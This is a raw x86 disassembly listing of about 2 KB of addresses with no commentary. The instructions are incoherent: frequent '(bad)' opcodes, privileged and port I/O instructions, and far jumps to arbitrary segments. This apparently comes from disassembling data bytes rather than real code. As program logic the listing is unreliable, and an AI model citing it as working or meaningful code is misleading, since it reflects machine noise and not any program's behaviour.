  40e6fd:	test   BYTE PTR [ebx+0xe440824],0xf0
  40e704:	or     al,dl
  40e706:	retf   
  40e707:	in     eax,0xef
  40e709:	and    BYTE PTR [edi+0x45],dh
  40e70c:	mov    bh,0xae
  40e70e:	xchg   ebx,eax
  40e70f:	or     eax,0x24c2ecad
  40e714:	adc    al,dl
  40e716:	loop   0x40e71d
  40e718:	repnz rcl BYTE PTR [edi+eiz*2-0xa],1
  40e71d:	test   eax,0x74ab1dcc
  40e722:	int    0xa5
  40e724:	scas   al,BYTE PTR es:[edi]
  40e725:	lds    ebp,FWORD PTR [ecx-0x36]
  40e728:	inc    ecx
  40e729:	jle    0x40e75b
  40e72b:	and    esp,DWORD PTR [ecx-0x1a64bb41]
  40e731:	mov    gs,WORD PTR [ebx]
  40e733:	adc    bh,BYTE PTR [edx]
  40e735:	sub    dl,BYTE PTR [edi-0x3e]
  40e738:	and    BYTE PTR [edx],bh
  40e73a:	jnp    0x40e758
  40e73c:	aad    0x45
  40e73e:	mov    ds,WORD PTR [ecx+ebp*4-0x80]
  40e742:	nop
  40e743:	es (bad) 
  40e745:	push   eax
  40e746:	or     BYTE PTR [ecx],al
  40e748:	adc    DWORD PTR [edi-0x1c1c6e8b],ebx
  40e74e:	mov    ebp,0x2cac19be
  40e753:	lods   al,BYTE PTR ds:[esi]
  40e754:	xor    DWORD PTR [ecx-0x7474d41d],edx
  40e75a:	jb     0x40e709
  40e75c:	xchg   BYTE PTR ds:0xed650ed3,bl
  40e762:	sub    ch,BYTE PTR [ebx*4+0x26427291]
  40e769:	mov    bh,0xc6
  40e76b:	clc    
  40e76c:	ror    DWORD PTR [esi],cl
  40e76e:	fs cld 
  40e770:	push   ds
  40e771:	lea    edx,[esi+0x4fbf4bf4]
  40e777:	inc    esi
  40e778:	push   edx
  40e779:	jbe    0x40e790
  40e77b:	dec    ebp
  40e77c:	jne    0x40e799
  40e77e:	ins    BYTE PTR es:[edi],dx
  40e77f:	test   DWORD PTR [esi-0x8],esp
  40e782:	test   BYTE PTR [esi],bh
  40e784:	pop    es
  40e785:	cmp    BYTE PTR [edx+edx*1+0x5fc49052],ch
  40e78c:	or     BYTE PTR [ebp-0xa],dl
  40e78f:	and    al,0x1
  40e791:	fnstenv [edx-0x3f]
  40e794:	pop    ds
  40e795:	xchg   ecx,eax
  40e796:	mov    DWORD PTR [eax-0x4965adaf],ebx
  40e79c:	jl     0x40e736
  40e79e:	rcl    cl,0xe6
  40e7a1:	mov    ds:0x7b2d6773,eax
  40e7a6:	sti    
  40e7a7:	ret    
  40e7a8:	pop    eax
  40e7a9:	(bad)  
  40e7aa:	ss pop ecx
  40e7ac:	jnp    0x40e753
  40e7ae:	adc    eax,0x32bd651d
  40e7b3:	(bad)  
  40e7b5:	xor    ebx,DWORD PTR [esi-0x5c607561]
  40e7bb:	(bad)  
  40e7bc:	xchg   ebx,eax
  40e7bd:	mov    cl,0x28
  40e7bf:	aas    
  40e7c0:	push   esi
  40e7c1:	fbld   TBYTE PTR [ebp+0x196ba293]
  40e7c7:	mov    esi,0xe6cfd5fa
  40e7cc:	adc    DWORD PTR [eax+eiz*8],ebx
  40e7cf:	cmp    DWORD PTR [edx+eax*2-0xa],ebp
  40e7d3:	and    esi,ebp
  40e7d5:	add    dh,BYTE PTR [ebx+0x10]
  40e7d8:	mov    edx,0x7757db1e
  40e7dd:	pop    eax
  40e7de:	xchg   ebx,eax
  40e7df:	and    BYTE PTR [ebx],cl
  40e7e1:	sbb    edi,edx
  40e7e3:	fbld   TBYTE PTR [edi-0x53220fd]
  40e7e9:	xchg   edx,eax
  40e7ea:	jmp    0x4eaff9ac
  40e7ef:	mov    ch,0x47
  40e7f1:	icebp  
  40e7f2:	xchg   edx,eax
  40e7f3:	mov    ds:0xadb3555e,eax
  40e7f8:	mov    al,ds:0x174730ff
  40e7fd:	cmp    esi,DWORD PTR [edi+0x5e]
  40e800:	push   edx
  40e801:	adc    bl,BYTE PTR [esp+esi*1+0x33]
  40e805:	or     DWORD PTR [esi],ebp
  40e807:	iret   
  40e808:	lds    eax,FWORD PTR [edx+edx*4]
  40e80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e80c:	lock repnz lea edx,[eax]
  40e810:	fwait
  40e811:	sbb    al,BYTE PTR [ebx+eax*8-0x435e4484]
  40e818:	push   esp
  40e819:	mov    es,esp
  40e81b:	cs xor al,0xf
  40e81e:	fild   DWORD PTR [ebx-0x6f]
  40e821:	pop    ecx
  40e822:	imul   ebx,DWORD PTR [esi-0x60],0xffffffe2
  40e826:	rcr    esp,cl
  40e828:	dec    ecx
  40e829:	js     0x40e7f7
  40e82b:	enter  0x2024,0x4d
  40e82f:	dec    edx
  40e830:	call   0x28836294
  40e835:	jmp    0x40e82c
  40e837:	test   eax,0x4df15d7a
  40e83c:	(bad)  
  40e83d:	push   ss
  40e83e:	lods   eax,DWORD PTR ds:[esi]
  40e83f:	mov    ah,ah
  40e841:	(bad)  
  40e842:	shl    BYTE PTR [ebp-0x5],1
  40e845:	xchg   edx,eax
  40e846:	jmp    0x512:0xcc7f90a4
  40e84d:	push   esp
  40e84e:	cmp    dl,dh
  40e850:	fisttp DWORD PTR [eax-0x4f6d0a16]
  40e856:	sub    al,0x70
  40e858:	sbb    eax,0x77fe7f39
  40e85d:	in     al,dx
  40e85e:	daa    
  40e85f:	xchg   esi,eax
  40e860:	ja     0x40e83c
  40e862:	cmc    
  40e863:	cli    
  40e864:	sub    eax,DWORD PTR [ebx]
  40e866:	idiv   DWORD PTR ds:0xedcb7775
  40e86c:	mov    eax,0x98b983a5
  40e871:	xor    ah,BYTE PTR [ebx+0x7fb01c1]
  40e877:	sbb    esp,DWORD PTR [edx+0x6810cd5a]
  40e87d:	dec    ebx
  40e87e:	adc    edx,DWORD PTR [edx+ebp*4-0x13]
  40e882:	add    DWORD PTR [eax+0x60],0x76
  40e886:	in     al,dx
  40e887:	nop
  40e888:	pop    ds
  40e889:	sbb    edi,DWORD PTR [edi]
  40e88b:	cmp    al,0x6b
  40e88d:	sub    edx,edi
  40e88f:	test   al,0xf1
  40e891:	jge    0x40e906
  40e893:	test   DWORD PTR [edi-0x2a],0x6547bcdc
  40e89a:	iret   
  40e89b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89c:	test   al,0xb8
  40e89e:	push   ds
  40e89f:	scas   al,BYTE PTR es:[edi]
  40e8a0:	jb     0x40e88f
  40e8a2:	sbb    DWORD PTR [edx-0x7c],ebp
  40e8a5:	imul   eax,edx,0x47ed107e
  40e8ab:	xor    bh,bl
  40e8ad:	mov    cl,dh
  40e8af:	dec    ecx
  40e8b0:	sbb    BYTE PTR [ebx+0xaa55f49],dh
  40e8b6:	mov    cl,bh
  40e8b8:	add    BYTE PTR [ebx+0x1e],cl
  40e8bb:	pop    edx
  40e8bc:	lock jecxz 0x40e927
  40e8bf:	cwd    
  40e8c1:	sar    bl,1
  40e8c3:	cmp    al,0x10
  40e8c5:	pop    eax
  40e8c6:	ins    DWORD PTR es:[edi],dx
  40e8c7:	ins    DWORD PTR es:[edi],dx
  40e8c8:	loop   0x40e8c5
  40e8ca:	in     eax,dx
  40e8cb:	xchg   edi,eax
  40e8cc:	test   BYTE PTR [edi-0x231b5bd9],al
  40e8d2:	mov    al,ds:0xb4de5ecf
  40e8d7:	jg     0x40e904
  40e8d9:	arpl   di,ax
  40e8db:	imul   ecx,DWORD PTR [ecx+0x139e2caf],0x66
  40e8e2:	adc    DWORD PTR [ecx+edx*2-0xc],edx
  40e8e6:	sar    BYTE PTR [ebx+eiz*8+0x7fe8b28a],cl
  40e8ed:	mov    ss,WORD PTR [eax+0x45]
  40e8f0:	aas    
  40e8f1:	mov    edx,eax
  40e8f3:	jb     0x40e967
  40e8f5:	test   BYTE PTR [eax],cl
  40e8f7:	je     0x40e950
  40e8f9:	repz dec esp
  40e8fb:	xor    DWORD PTR [eax-0x56],edx
  40e8fe:	dec    ebx
  40e8ff:	inc    edi
  40e900:	in     al,dx
  40e901:	mov    ah,0x23
  40e903:	ins    DWORD PTR es:[edi],dx
  40e904:	mov    esi,0xc7e36358
  40e909:	add    ah,al
  40e90b:	not    ebp
  40e90d:	out    dx,al
  40e90e:	mov    bh,dl
  40e910:	sbb    al,0x83
  40e912:	or     eax,0x6b06b0ae
  40e917:	cmp    eax,0x99f3b485
  40e91c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e91d:	jmp    0x51a6b66
  40e922:	xor    BYTE PTR [ecx+0x69],al
  40e925:	fadd   QWORD PTR [esi+ebx*4+0x30]
  40e929:	mov    dl,0xa
  40e92b:	fdiv   DWORD PTR [ebp+0x20621fa8]
  40e931:	jne    0x40e8be
  40e933:	sti    
  40e934:	mov    ebx,0xb1ddc899
  40e939:	mov    bl,0xc4
  40e93b:	add    DWORD PTR [ebx-0x16],0xffffffc4
  40e93f:	daa    
  40e940:	inc    BYTE PTR [eax]
  40e942:	mov    edx,cs
  40e944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e945:	stos   DWORD PTR es:[edi],eax
  40e946:	inc    esi
  40e947:	dec    eax
  40e948:	das    
  40e949:	mov    eax,ds:0xb73f9b0f
  40e94e:	jecxz  0x40e926
  40e950:	xchg   ebp,eax
  40e951:	sub    ecx,eax
  40e953:	pop    es
  40e954:	xchg   edx,eax
  40e955:	cmp    esi,DWORD PTR [edi-0x736fbf12]
  40e95b:	inc    edx
  40e95c:	push   eax
  40e95d:	push   cs
  40e95e:	ret    
  40e95f:	push   ebp
  40e960:	inc    eax
  40e961:	(bad)  [esp+esi*2-0x2f]
  40e965:	cdq    
  40e966:	mov    bh,bh
  40e968:	cli    
  40e969:	lods   eax,DWORD PTR ds:[esi]
  40e96a:	in     al,dx
  40e96b:	sub    DWORD PTR [esi+0x230c72dd],ebp
  40e971:	lods   al,BYTE PTR ds:[esi]
  40e972:	jae    0x40e907
  40e974:	push   esi
  40e975:	xchg   esp,eax
  40e976:	jne    0x40e9e7
  40e978:	test   esi,edi
  40e97a:	mov    dl,0xa
  40e97c:	test   eax,0x6538d366
  40e981:	or     al,0xb9
  40e983:	sub    al,0x1d
  40e985:	sub    cl,0xeb
  40e988:	cwde   
  40e989:	or     ecx,DWORD PTR [ebx+0x11]
  40e98c:	pop    ebp
  40e98d:	or     DWORD PTR [edx],esp
  40e98f:	push   es
  40e990:	mov    esp,0xcfd2fd6d
  40e995:	and    DWORD PTR [edx+0x3b],esi
  40e998:	imul   ebp,ecx,0x0
  40e99b:	jge    0x40e95d
  40e99d:	adc    al,0x9
  40e99f:	stos   BYTE PTR es:[edi],al
  40e9a0:	sbb    al,0x95
  40e9a2:	xor    dh,ah
  40e9a4:	fisubr DWORD PTR [eax]
  40e9a6:	jbe    0x40e9d9
  40e9a8:	jle    0x40e964
  40e9aa:	sahf   
  40e9ab:	mov    eax,ds:0xe9e538e5
  40e9b0:	mov    ch,0xc1
  40e9b2:	ret    
  40e9b3:	mov    ?,esp
  40e9b5:	fisub  WORD PTR [ebx]
  40e9b7:	ret    
  40e9b8:	or     al,BYTE PTR [esi]
  40e9ba:	mov    edi,0xa7b78a9a
  40e9bf:	inc    ebx
  40e9c0:	cmp    BYTE PTR [edx-0x1937054c],bl
  40e9c6:	ja     0x40ea0c
  40e9c8:	cmp    ebx,DWORD PTR [ebx+0x693b2e66]
  40e9ce:	ja     0x40e9bb
  40e9d0:	dec    esp
  40e9d1:	imul   ebp,DWORD PTR [edx+0x15],0xc57c3a37
  40e9d8:	pop    eax
  40e9d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9da:	xor    eax,0x2970863c
  40e9df:	loop   0x40e979
  40e9e1:	jl     0x40e97c
  40e9e3:	add    edi,DWORD PTR [ebx+edi*2-0x2f89b200]
  40e9ea:	fstp   QWORD PTR [eax+0x3faab5d7]
  40e9f0:	and    ah,BYTE PTR ds:0xa92168a0
  40e9f6:	inc    ebp
  40e9f7:	push   eax
  40e9f8:	(bad)  
  40e9f9:	loope  0x40ea0c
  40e9fb:	mov    al,ds:0x9addecd2
  40ea00:	pop    edx
  40ea01:	push   ecx
  40ea02:	cwde   
  40ea03:	mov    ebx,0x86d3221a
  40ea08:	popf   
  40ea09:	cs add al,0xb3
  40ea0c:	push   esp
  40ea0d:	adc    BYTE PTR [ebx+0x33],ah
  40ea10:	jge    0x40e9e1
  40ea12:	xchg   BYTE PTR [edi+0x76],dl
  40ea15:	inc    esi
  40ea16:	ror    DWORD PTR [esp+ebx*1+0x17],1
  40ea1a:	icebp  
  40ea1b:	ins    DWORD PTR es:[edi],dx
  40ea1c:	xor    BYTE PTR [edx+0x377e48c7],0x36
  40ea23:	add    ah,al
  40ea25:	ffreep st(1)
  40ea27:	push   edi
  40ea28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea29:	out    0x70,al
  40ea2b:	lds    edi,FWORD PTR [esi+0x6e6622cc]
  40ea31:	addr16 lock jmp 0xd092:0xe2f12d1c
  40ea3a:	dec    eax
  40ea3b:	jle    0x40ea85
  40ea3d:	jbe    0x40ea38
  40ea3f:	pushf  
  40ea40:	pop    esp
  40ea41:	(bad)  
  40ea42:	cmp    dl,BYTE PTR [edi+0x55]
  40ea45:	push   eax
  40ea46:	cmp    ecx,ecx
  40ea48:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40ea4a:	sub    al,0x67
  40ea4c:	xchg   edx,eax
  40ea4d:	mov    edi,0x66028c3d
  40ea52:	jmp    0x40eacd
  40ea54:	adc    al,0xee
  40ea56:	arpl   dx,ax
  40ea58:	sbb    esi,DWORD PTR [edi+0x52d56df4]
  40ea5e:	ffreep st(5)
  40ea60:	mov    ebp,0xae0ddc86
  40ea65:	xor    BYTE PTR [eax-0x43],dl
  40ea68:	retf   0xfcb
  40ea6b:	(bad)  
  40ea6c:	test   eax,0xc1b5ba7b
  40ea71:	add    cl,cl
  40ea73:	cld    
  40ea74:	mov    al,cs:0xb7db1d93
  40ea7a:	cmp    eax,0x870e1fe1
  40ea7f:	es popa 
  40ea81:	bound  esi,QWORD PTR [ecx]
  40ea83:	data16 lahf 
  40ea85:	and    ah,BYTE PTR [edi]
  40ea87:	xor    eax,ebx
  40ea89:	pop    ebp
  40ea8a:	shl    BYTE PTR [ecx-0x65],0x68
  40ea8e:	fst    DWORD PTR ds:0xd847ba6d
  40ea94:	or     ah,BYTE PTR [esi+0x3418b4ff]
  40ea9a:	(bad)  
  40ea9c:	add    DWORD PTR [ecx+ecx*4-0x1c],ecx
  40eaa0:	pop    esi
  40eaa1:	scas   al,BYTE PTR es:[edi]
  40eaa2:	fdivr  QWORD PTR [edi+0x5caec49f]
  40eaa8:	test   eax,0xa095e705
  40eaad:	push   ss
  40eaae:	sub    BYTE PTR [eax],dh
  40eab0:	in     eax,dx
  40eab1:	addr16 pop eax
  40eab3:	ja     0x40ea56
  40eab5:	popa   
  40eab6:	fcom   QWORD PTR [edx-0x75c38843]
  40eabc:	mov    ah,0x5d
  40eabe:	ins    DWORD PTR es:[edi],dx
  40eabf:	scas   al,BYTE PTR es:[edi]
  40eac0:	xor    bl,BYTE PTR [ebx-0x19961852]
  40eac6:	push   ebp
  40eac7:	mov    esp,0x757e45f5
  40eacc:	sbb    dl,dl
  40eace:	ins    DWORD PTR es:[edi],dx
  40eacf:	jne    0x40ea9d
  40ead1:	push   0x6b
  40ead3:	jcxz   0x40ead7
  40ead6:	(bad)  
  40ead7:	mov    dh,0x9c
  40ead9:	inc    ecx
  40eada:	mov    dh,0xf
  40eadc:	adc    dh,BYTE PTR ss:[esi+ecx*2-0x1]
  40eae1:	adc    eax,0x34e5ed00
  40eae6:	cmp    eax,0x1b50dc4b
  40eaeb:	daa    
  40eaec:	scas   al,BYTE PTR es:[edi]
  40eaed:	mov    ebp,0x4a63fd0e
  40eaf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaf3:	push   edx
  40eaf4:	pop    ecx
  40eaf5:	sbb    BYTE PTR [ebp+0x77612bac],ch
  40eafb:	lahf   
  40eafc:	loopne 0x40eb10
  40eafe:	xor    al,BYTE PTR [eax]
  40eb00:	(bad)  
  40eb01:	xchg   ebp,eax
  40eb02:	pop    edi
  40eb03:	mov    BYTE PTR [eax+0x1d],ah
  40eb06:	sub    al,0xff
  40eb08:	cmp    esp,DWORD PTR [edx]
  40eb0a:	cmc    
  40eb0b:	scas   eax,DWORD PTR es:[edi]
  40eb0c:	push   ebp
  40eb0d:	mov    al,ds:0x24b102
  40eb12:	xchg   DWORD PTR [ebx+edx*8],esp
  40eb15:	(bad)  
  40eb16:	bound  ebx,QWORD PTR [eax+esi*8+0x7]
  40eb1a:	mov    cl,0x2d
  40eb1c:	push   esi
  40eb1d:	cli    
  40eb1e:	movq   QWORD PTR [edx-0x6f81bdb6],mm7
  40eb25:	jne    0x40eaf0
  40eb27:	push   ss
  40eb28:	xchg   edi,eax
  40eb29:	dec    edx
  40eb2a:	push   edi
  40eb2b:	inc    ebp
  40eb2c:	pop    ebp
  40eb2d:	adc    bl,bh
  40eb2f:	add    ah,ah
  40eb31:	loope  0x40eb63
  40eb33:	loopne 0x40eb99
  40eb35:	mov    bl,0xc9
  40eb37:	inc    ebp
  40eb38:	popf   
  40eb39:	dec    esi
  40eb3a:	or     dh,bh
  40eb3c:	cwde   
  40eb3d:	ret    0x1955
  40eb40:	sbb    edx,0x29
  40eb43:	call   0x5b2b:0xd57091f9
  40eb4a:	sbb    DWORD PTR [ebp-0x73e9e80a],edi
  40eb50:	ja     0x40eb59
  40eb52:	push   edi
  40eb54:	sbb    ecx,ebx
  40eb56:	ins    BYTE PTR es:[edi],dx
  40eb57:	mov    ?,esi
  40eb59:	ins    DWORD PTR es:[edi],dx
  40eb5a:	pop    esi
  40eb5b:	imul   eax,DWORD PTR [ecx+0x57],0xffffffdf
  40eb5f:	push   0x6d
  40eb61:	mov    edi,0x6967f687
  40eb66:	pop    ds
  40eb67:	inc    edx
  40eb68:	(bad)  
  40eb69:	and    al,0xc2
  40eb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb6c:	jo     0x40ebed
  40eb6e:	les    edx,FWORD PTR [ecx-0x36]
  40eb71:	popf   
  40eb72:	test   eax,0xc059edd3
  40eb77:	ss ret 0x81d6
  40eb7b:	icebp  
  40eb7c:	push   ecx
  40eb7e:	shl    DWORD PTR [ebp-0x4b68d861],0x8
  40eb85:	(bad)  
  40eb86:	xor    BYTE PTR [edi+0x5ba1ad83],cl
  40eb8c:	repz rol BYTE PTR [ebp-0x752f3e30],1
  40eb93:	mov    ds:0xc5cb3397,al
  40eb98:	push   ds
  40eb99:	addr16 mov al,0xcf
  40eb9c:	add    DWORD PTR [edi+eiz*1+0x448f875f],0x43
  40eba4:	sub    BYTE PTR [edi],ah
  40eba6:	retf   
  40eba7:	jp     0x40ebca
  40eba9:	mov    ebp,0x7fdb180e
  40ebae:	loop   0x40eb77
  40ebb0:	xchg   ebp,eax
  40ebb1:	mov    ecx,DWORD PTR [ecx-0x6258110e]
  40ebb7:	mov    edi,DWORD PTR [edx-0x60777573]
  40ebbd:	cmp    BYTE PTR [esi],cl
  40ebbf:	adc    BYTE PTR ds:0xe3a49f5a,bh
  40ebc5:	cmp    al,0x8a
  40ebc7:	enter  0x3968,0xeb
  40ebcb:	inc    esi
  40ebcc:	inc    dx
  40ebce:	enter  0x5833,0x36
  40ebd2:	dec    esi
  40ebd3:	xor    DWORD PTR [ecx],edx
  40ebd5:	jo     0x40ec1c
  40ebd7:	cmp    al,0x45
  40ebd9:	int3   
  40ebda:	adc    al,0x67
  40ebdc:	lds    edi,FWORD PTR [eax]
  40ebde:	(bad)  
  40ebdf:	dec    eax
  40ebe0:	pop    es
  40ebe1:	push   cs
  40ebe2:	push   edi
  40ebe3:	sub    eax,0x68945477
  40ebe8:	fcomp  DWORD PTR [eax]
  40ebea:	mov    esi,0x2d7f4d6e
  40ebef:	jl     0x40ec62
  40ebf1:	cld    
  40ebf2:	sub    al,0x8d
  40ebf4:	hlt    
  40ebf5:	cmp    al,0xc5
  40ebf7:	sbb    ecx,0xeb8914cd
  40ebfd:	call   0x5fac:0x14c48728
  40ec04:	pop    ds
  40ec05:	cld    
  40ec06:	retf   
  40ec07:	add    ebp,eax
  40ec09:	jb     0x40ec50
  40ec0b:	xchg   edx,eax
  40ec0c:	mov    DWORD PTR [edx],ebx
  40ec0e:	loopne 0x40ebfb
  40ec10:	add    eax,0x59156bd1
  40ec15:	mov    WORD PTR [ecx],cs
  40ec17:	pop    ebx
  40ec18:	ins    DWORD PTR es:[edi],dx
  40ec19:	adc    DWORD PTR [ebp+0x56],0x30eb19eb
  40ec20:	fldpi  
  40ec22:	je     0x40ec2c
  40ec24:	mov    ds:0x367820be,eax
  40ec29:	popf   
  40ec2a:	into   
  40ec2b:	shl    DWORD PTR [edx+0x57],1
  40ec2e:	jmp    0x45a9:0xe17b44e0
  40ec35:	mov    DWORD PTR [ecx],edi
  40ec37:	scas   eax,DWORD PTR es:[edi]
  40ec38:	pop    edx
  40ec39:	rcl    cl,cl
  40ec3b:	dec    esi
  40ec3c:	or     DWORD PTR [ebx+0x62391932],ecx
  40ec42:	inc    edi
  40ec43:	xchg   edi,eax
  40ec44:	or     BYTE PTR [ecx],0x3a
  40ec47:	ffreep st(7)
  40ec49:	mov    eax,0x53f6ded2
  40ec4e:	mov    esp,0x29b0c9a4
  40ec53:	push   esi
  40ec54:	push   ecx
  40ec55:	dec    eax
  40ec56:	jno    0x40ec5e
  40ec58:	sbb    BYTE PTR gs:[eax+ecx*8+0x52],0x90
  40ec5e:	pop    edx
  40ec5f:	sub    DWORD PTR [edx+0x57cb578f],0xffffffb8
  40ec66:	cmp    bh,BYTE PTR [esi+esi*1-0x4d]
  40ec6a:	jb     0x40ec53
  40ec6c:	test   al,0x1a
  40ec6e:	sbb    DWORD PTR [ecx],edi
  40ec70:	aas    
  40ec71:	pop    ds
  40ec72:	inc    eax
  40ec73:	loop   0x40ecb6
  40ec75:	add    ch,BYTE PTR [ebx]
  40ec77:	pop    ebx
  40ec78:	mov    dl,0xd6
  40ec7a:	mov    bh,0x90
  40ec7c:	add    cl,BYTE PTR [edi+0x5c]
  40ec7f:	lock xchg esi,eax
  40ec81:	mov    ecx,DWORD PTR [edx+0x75]
  40ec84:	pop    eax
  40ec85:	xchg   ecx,eax
  40ec86:	in     eax,0x6f
  40ec88:	mov    dl,0xc0
  40ec8a:	mov    bl,BYTE PTR [edi-0x564cbdbb]
  40ec90:	dec    edi
  40ec91:	xchg   ebx,eax
  40ec92:	lock es (bad) 
  40ec96:	push   ecx
  40ec97:	enter  0x7a7b,0xe1
  40ec9b:	or     esi,DWORD PTR [eax]
  40ec9d:	dec    ebp
  40ec9e:	jp     0x40ecd2
  40eca0:	pop    ebx
  40eca1:	cmp    al,0x8b
  40eca3:	fbstp  TBYTE PTR [ebx]
  40eca5:	push   esi
  40eca6:	push   edi
  40eca7:	je     0x40ec29
  40eca9:	mov    ebx,0xf3b268b1
  40ecae:	xchg   ebp,eax
  40ecaf:	xchg   esp,eax
  40ecb0:	inc    eax
  40ecb1:	push   ecx
  40ecb2:	test   BYTE PTR [ebx-0x1b],bh
  40ecb5:	movhps xmm6,QWORD PTR [ebx+0x6c]
  40ecb9:	fdivr  DWORD PTR gs:[ecx-0x70]
  40ecbd:	adc    al,0x91
  40ecbf:	(bad)
  40ecc4:	adc    DWORD PTR [edx+0x257d704f],0x4c
  40eccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eccc:	adc    bh,BYTE PTR [eax+0x39]
  40eccf:	fmul   DWORD PTR [edx+0x7]
  40ecd2:	(bad)  
  40ecd3:	fsubr  DWORD PTR gs:[ebx]
  40ecd6:	xor    ebx,DWORD PTR [eax-0x3c2d96fe]
  40ecdc:	int    0x26
  40ecde:	xchg   ecx,eax
  40ecdf:	nop
  40ece0:	ficomp DWORD PTR [edi-0x31ad42ea]
  40ece6:	pushf  
  40ece7:	add    al,0x7d
  40ece9:	in     al,0x64
  40eceb:	sub    eax,0x22a860cd
  40ecf0:	xchg   DWORD PTR [ebp+0x449f1fb4],esi
  40ecf6:	fiadd  DWORD PTR [ebx-0x47c88550]
  40ecfc:	mov    ds:0x819ff020,eax
  40ed01:	or     dl,cl
  40ed03:	or     eax,0x40c573e8
  40ed08:	or     al,0xd1
  40ed0a:	stos   DWORD PTR es:[edi],eax
  40ed0b:	jp     0x40ecb0
  40ed0d:	bnd jg 0x40ed11
  40ed10:	cmp    al,0xff
  40ed12:	push   0xffffffb4
  40ed14:	int3   
  40ed15:	add    bh,ch
  40ed17:	xor    bl,bh
  40ed19:	pop    edi
  40ed1a:	mov    ds:0x373fbd85,eax
  40ed1f:	test   BYTE PTR [ebp-0x6adc2368],0x42
  40ed26:	stos   BYTE PTR es:[edi],al
  40ed27:	xlat   BYTE PTR ds:[ebx]
  40ed28:	in     al,0x7f
  40ed2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed2b:	cli    
  40ed2c:	rcl    DWORD PTR [edx+0x62],0x37
  40ed30:	jmp    0x40ed10
  40ed32:	xchg   edi,eax
  40ed33:	nop
  40ed34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed35:	out    0xc0,al
  40ed37:	mov    ch,0x22
  40ed39:	fidivr DWORD PTR [ebx+0x7bd602fc]
  40ed3f:	aaa    
  40ed40:	mov    edx,0x5ed3b6e9
  40ed45:	add    DWORD PTR [edi+0x2f],0x4d
  40ed49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed4b:	or     eax,0xffffffb1
  40ed4e:	mov    esi,0x1b4e30ab
  40ed53:	add    esp,DWORD PTR [esi+0x5225dc39]
  40ed59:	test   BYTE PTR cs:[ebp-0x5178d7cf],cl
  40ed60:	aaa    
  40ed61:	dec    esi
  40ed62:	cmc    
  40ed63:	retf   
  40ed64:	mov    bl,0x87
  40ed66:	mov    ss,ebp
  40ed68:	scas   eax,DWORD PTR es:[edi]
  40ed69:	cwde   
  40ed6a:	mov    ds:0x6a0ad951,al
  40ed6f:	(bad)  
  40ed70:	loopne 0x40edcd
  40ed72:	shl    BYTE PTR [ecx],cl
  40ed74:	cmp    ecx,edx
  40ed76:	mov    al,ds:0x899aae61
  40ed7b:	jle    0x40ed99
  40ed7d:	mov    al,ds:0xaffab9e8
  40ed82:	xor    al,0xe0
  40ed84:	pusha  
  40ed85:	stos   BYTE PTR es:[edi],al
  40ed86:	out    dx,eax
  40ed87:	stos   DWORD PTR es:[edi],eax
  40ed88:	into   
  40ed89:	in     eax,0x3b
  40ed8b:	xor    BYTE PTR [ecx+ebx*4-0x7c7cdfc8],dl
  40ed92:	mov    esp,ecx
  40ed94:	or     dl,cl
  40ed96:	repnz cmp DWORD PTR [ecx],0x4e
  40ed9a:	in     eax,dx
  40ed9b:	aam    0xe8
  40ed9d:	cmp    dl,BYTE PTR [eax]
  40ed9f:	jnp    0x40edba
  40eda1:	xchg   BYTE PTR [edi-0x1a],dh
  40eda4:	and    dl,ch
  40eda6:	xor    al,0x22
  40eda8:	mov    ah,0xc2
  40edaa:	mov    ds:0xf717f0cc,al
  40edaf:	inc    ebx
  40edb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edb1:	fisttp DWORD PTR [edx+0x2772cc6d]
  40edb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb8:	sbb    ebx,esp
  40edba:	pusha  
  40edbb:	mov    al,0x88
  40edbd:	retf   
  40edbe:	xor    eax,0x69c0ff5a
  40edc3:	mov    bh,dh
  40edc5:	dec    ebp
  40edc6:	and    al,0xdc
  40edc8:	test   ecx,0x6505d398
  40edce:	lock jecxz 0x40ee3b
  40edd1:	cwde   
  40edd2:	fwait
  40edd3:	test   dh,al
  40edd5:	sahf   
  40edd6:	sub    al,BYTE PTR [ebp+0x67]
  40edd9:	std    
  40edda:	pop    esp
  40eddb:	sahf   
  40eddc:	test   bl,dl
  40edde:	add    DWORD PTR [edx+ecx*4],0xe91bb334
  40ede5:	or     bh,BYTE PTR [ebp-0x5d]
  40ede8:	lock jbe 0x40ee4a
  40edeb:	leave  
  40edec:	mov    cl,0xba
  40edee:	sbb    al,0x7d
  40edf0:	pop    ecx
  40edf1:	adc    DWORD PTR [ecx+ecx*8+0x5ab7cfd9],edx
  40edf8:	fdivp  st(3),st
  40edfa:	(bad)  
  40edfb:	inc    eax
  40edfc:	mov    ecx,0x30c203ae
  40ee01:	inc    ebp
  40ee02:	popa   
  40ee03:	inc    ebp
  40ee04:	fcmovbe st,st(6)
  40ee06:	fcom   QWORD PTR ds:[edx]
  40ee09:	stc    
  40ee0a:	and    al,bh
  40ee0c:	imul   DWORD PTR [edx]
  40ee0e:	sbb    esi,ebp
  40ee10:	mov    esi,0x6021cdd3
  40ee15:	pop    edx
  40ee16:	push   esi
  40ee17:	adc    BYTE PTR [ebx*8-0x207f0a5d],ch
  40ee1e:	arpl   bx,sp
  40ee20:	pop    esp
  40ee21:	jmp    0x40ee4e
  40ee23:	or     eax,0x4ab08332
  40ee28:	pop    ebp
  40ee29:	stc    
  40ee2a:	adc    BYTE PTR [ebp+edx*4+0xf0c7300],dh
  40ee31:	out    0x2d,al
  40ee33:	(bad)  
  40ee34:	call   0xb017e803
  40ee39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3a:	adc    eax,0xafd0b144
  40ee3f:	and    ebp,ebp
  40ee41:	mov    bl,0xc4
